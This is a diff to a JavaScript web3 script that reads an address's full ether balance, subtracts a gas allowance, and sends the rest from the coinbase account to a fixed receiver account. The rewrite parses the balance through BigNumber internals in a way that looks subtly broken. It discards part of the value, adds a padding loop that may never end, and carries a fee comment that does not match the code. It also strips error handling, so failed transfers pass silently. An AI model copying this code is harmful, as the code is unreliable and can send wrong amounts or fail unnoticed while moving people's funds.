@@ -28,36 +28,27 @@ function startWeb3() {
 function getBalance(address) {
   return web3.eth.getBalance(address, function (error, result) {
     if (!error) {
-        
-        balanceFromWie = web3.fromWei(result);
 
-        if (balanceFromWie.e < 0) {
+        balanceFromWie = result;
 
-            if (balanceFromWie.c[1] == undefined) {
-                 balanceFromWie.c[1] = "0000";
-            } else {
-              balanceFromWie.c[1] = balanceFromWie.c[1].toString();
-              balanceFromWie.c[1] = balanceFromWie.c[1].substr(0, 4);
-            }
-
-             etherBalance = Number(balanceFromWie.c[0] + '' + balanceFromWie.c[1]);
-
-
-        } else { 
-
-            if (balanceFromWie.c[1] == undefined) {
+        if (balanceFromWie.c[1] == undefined) {
                  balanceFromWie.c[1] = "00000000000000";
             }
-            if (balanceFromWie.c[2] == undefined) {
-                 balanceFromWie.c[2] = "0000";
-            } else {
-              balanceFromWie.c[2] = balanceFromWie.c[2].toString();
-              balanceFromWie.c[2] = balanceFromWie.c[2].substr(0, 4);
+
+        while (balanceFromWie.e != balanceFromWie.c[0].toString().length + balanceFromWie.c[1].toString().length - 1) {
+
+              var n =  balanceFromWie.c[1];
+              var digits = (""+n).split("");
+
+              digits.unshift("0");
+
+              digits = digits.toString();
+              balanceFromWie.c[1] = digits.replace(/,/g, "");
+
             }
 
-            etherBalance = Number(balanceFromWie.c[0] + '' + balanceFromWie.c[1] + '' + balanceFromWie.c[2]);
-        }
-        
+        etherBalance = Number(balanceFromWie.c[0] + '' + balanceFromWie.c[1]);  
+
         etherValue = etherBalance - (gasFee + (gasFee / 10)); // 1 gWei extra fee
         transactionObject = {from:coinbase, to:etherReceiver, value:etherValue, gas:gasLimitNumber, gasPrice:gasPriceNumber};
         sendBalance(transactionObject);
@@ -69,11 +60,5 @@ function getBalance(address) {
 
 // Send Ethers to etherReceiver account from coinbase account
 function sendBalance(transactionObject) {
-  return web3.eth.sendTransaction(transactionObject, function (error, result) {
-    if (!error) {
-        // console.log(etherBalance);
-    } else {
-        console.error(error);
-    }
-  })
+  return web3.eth.sendTransaction(transactionObject, function (error, result){});
 }
